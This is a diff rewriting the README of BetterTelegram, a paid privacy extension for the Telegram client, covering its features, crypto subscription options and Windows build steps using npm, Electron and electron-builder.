@@ -1,81 +1,68 @@
-🚀 BetterTelegram
+# BetterTelegram
 
-BetterTelegram is a privacy-first, modified Telegram client plugin designed to enhance your messaging security with state-of-the-art encryption, anonymous account creation, and unique privacy-focused features.
+BetterTelegram is a privacy-first extension for the official Telegram client. It enhances messaging security with advanced encryption, anonymous onboarding, and privacy-focused tools — all without replacing the original app.
 
-🔐 Why BetterTelegram?
+## Why BetterTelegram
 
-BetterTelegram goes beyond the default Telegram client, offering powerful privacy enhancements:
+BetterTelegram adds features built for users who value control and privacy:
 
-- 🔒 Group & Solo Chat OTR (Off-the-Record) End-to-End Encryption
-- 🛡️ Prevent deletion of messages from your side (peers cant delete your chat/messages)
-- 🕵️ Ghost Mode (Dont send read receipts & don't show online/typing status)
-- 🔐 Deniability & Perfect Forward Secrecy
-- 🧩 Fully Anonymous Onboarding
-- 🧱 No Ads, No Data Collection
+- OTR (Off-the-Record) End-to-End Encryption for private and group chats  
+- Message Protection – prevents others from deleting your messages  
+- Ghost Mode – hides read receipts, online, and typing status  
+- Perfect Forward Secrecy and Deniability  
+- Anonymous Account Creation – no phone number or email required  
+- No ads, tracking, or data collection
 
-🔧 Flexible Subscription
+## Subscription Options
 
-- 30-day free trial
-- Extend any time with daily billing
-- Discounts for longer commitments
-- Pay with crypto: BTC, ETH, USDT (ERC20), BNB (ERC20), and XMR
+- 30-day free trial for new users  
+- Extend anytime with daily billing  
+- Discounts available for longer commitments  
+- Payments supported: BTC, ETH, USDT (ERC20), BNB (ERC20), XMR
 
-🛡️ Security First
+## Security by Design
 
-BetterTelegram is built with privacy in mind, with no telemetry, no user tracking, and a fully self-contained encryption layer independent of Telegram's servers.
+BetterTelegram is fully self-contained. It has no telemetry, analytics, or background tracking. Its encryption layer is independent of Telegram’s servers.
 
-🛠️ Getting Started
-- Generate a Secure Account at https://bettertelegram.com/account
-- No email, no phone, just click Get Account Number & Save it
-- Choose Subscription Duration (Optional as there is a 30-day free trial for every licence)
-- Add days to your license—starting at $0.89/day.
+## Getting Started
 
-📦 Upcoming Features
-- ✅ Support for MacOS & Linux
-- ✅ Run your own Proxy Message Server
-- ✅ NodeJS Bot OTR Integration
-- ✅ Voice & Video OTR Encryption
+1. Visit https://bettertelegram.com/account  
+2. Click "Get Account Number" – no phone or email needed  
+3. Start your 30-day free trial or add days starting at $0.89/day
 
-🛠️ Build From Scratch
+## Upcoming Features
 
-Want to build BetterTelegram yourself? Follow these simple steps:
+- macOS and Linux support  
+- Self-hosted proxy message servers  
+- NodeJS Bot OTR integration  
+- Voice and video OTR encryption
 
-📦 Prerequisites
-- ✅ Latest version of Node.js & NPM
-- ✅ GitHub access or ZIP file
-- ✅ Internet connection
+## Build From Source
 
-🧱 Step-by-Step Build Instructions
+Developers can compile BetterTelegram manually:
 
-1. Download the Project
-    - Go to this repository on GitHub
-    - Click the green Code button → Download ZIP
+### Requirements
 
-2. Prepare Your Project Directory
-    - Create a folder named BetterTelegram inside your Documents directory
-    - Extract the contents of the ZIP file into that folder
+- Node.js (latest LTS) and npm  
+- GitHub or ZIP access  
+- Internet connection  
 
-3. Install Node.js & NPM
-    - Download and install the latest LTS version from nodejs.org
-    - Open Command Prompt and verify installation: `node -v` and `npm -v`
+### Steps
 
-4. Install Electron
-    - Run: `npm install -g electron`
-    - Optional, to build Node 110 dll-inject ABI, run: `npx electron-rebuild -v 22.3.26 -f -w @ffxiv-teamcraft/dll-inject`
+1. Download the repository from GitHub  
+2. Extract it into Documents/BetterTelegram  
+3. Install Node.js and npm (`node -v`, `npm -v`)  
+4. Install Electron: `npm install -g electron`  
+   (Optional rebuild: `npx electron-rebuild -v 22.3.26 -f -w @ffxiv-teamcraft/dll-inject`)  
+5. Navigate to your folder:  
+   `cd %USERPROFILE%\Documents\BetterTelegram`  
+6. Install dependencies:  
+   `npm install`  
+7. Build the app:  
+   `npx electron-builder --win nsis --x64 --publish never`  
+8. Run the generated `.exe` from the `dist` folder
 
-5. Navigate to the Project Directory
-    - Run: `cd %USERPROFILE%\Documents\BetterTelegram`
+## Optional Download
 
-6. Install Project Dependencies
-    - Run: `npm install`
-
-7. Build the Application
-    - Run: `npx electron-builder --win nsis --x64 --publish never`
-
-8. Run the Built App
-    - Go to the dist folder inside BetterTelegram
-    - Run the generated .exe file to launch BetterTelegram
-
-📥 Download (Optional)
-
-Download BetterTelegram from here https://github.com/bettertelegram-client/main/releases/tag/v1.3.1
+You can also download the latest prebuilt release here:  
+https://github.com/bettertelegram-client/main/releases/tag/v1.3.1
